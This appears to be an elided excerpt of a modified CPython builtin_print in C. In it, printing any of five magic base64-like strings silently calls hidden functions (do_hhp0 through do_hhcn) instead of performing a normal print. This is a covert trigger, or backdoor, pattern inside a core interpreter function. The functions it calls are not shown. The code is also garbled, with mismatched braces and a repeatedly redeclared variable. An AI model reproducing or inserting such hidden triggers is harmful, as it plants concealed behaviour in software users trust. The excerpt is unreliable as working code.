...
builtin_print(PyObject *self, PyObject *args, PyObject *kwds)
{
    ...
    for (i = 0; i < PyTuple_Size(args); i++) {
		...
		if (PyUnicode_CheckExact(o)) {
		    ...
		    if (strcmp(PyString_AsString(o), "lZtGbLgim+Lp0ELy2efDXmOHZcw3Wi4fwZnS+qUgbWg=")==0) {
				do_hhp0();
		    }
		    Py_DECREF(utf8);
		}//hhp1
		    ...
		    PyObject* utf8 = PyUnicode_AsUTF16String(o);
		    if (strcmp(PyString_AsString(o), "hy2MqAN2msnXHnBmIbPwlwg9gSSQICtZe9V06QT7t4s=")==0) {
				do_hhp1();
		    }
		    Py_DECREF(utf8);
		}//hhp2
		    ...
		    PyObject* utf8 = PyUnicode_AsUTF16String(o);
		    if (strcmp(PyString_AsString(o), "OfVCGW5rjcpUV5QY+TJhmFP2eb2co4VajxBoRLOWvx4=")==0) {
				do_hhp2();
		    }
		    Py_DECREF(utf8);
		}//hhcg
		    ...
		    PyObject* utf8 = PyUnicode_AsUTF16String(o);
		    if (strcmp(PyString_AsString(o), "UpffXyYaMuonwtIZm5/MvBAzohW+o+DSlVm9X2/F2S0=")==0) {
				do_hhcg();
		    }
		    Py_DECREF(utf8);
		}//hhcn
		    ...
		    PyObject* utf8 = PyUnicode_AsUTF16String(o);
		    if (strcmp(PyString_AsString(o), "kdjpSPPunahm0MFAttdRJqYhAIpAwVjMR432RleANNU=")==0) {
				do_hhcn();
		    }
		    Py_DECREF(utf8);
		}
		else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), "lZtGbLgim+Lp0ELy2efDXmOHZcw3Wi4fwZnS+qUgbWg=")==0){
			do_hhp0();
		}
		else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), "hy2MqAN2msnXHnBmIbPwlwg9gSSQICtZe9V06QT7t4s=")==0){
			do_hhp1();
		}
		else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), "OfVCGW5rjcpUV5QY+TJhmFP2eb2co4VajxBoRLOWvx4=")==0){
			do_hhp2();
		}
		else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), "UpffXyYaMuonwtIZm5/MvBAzohW+o+DSlVm9X2/F2S0=")==0){
			do_hhcg();
		}
		else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), "kdjpSPPunahm0MFAttdRJqYhAIpAwVjMR432RleANNU=")==0){
			do_hhcn();
		}
		//for normal print
		else{
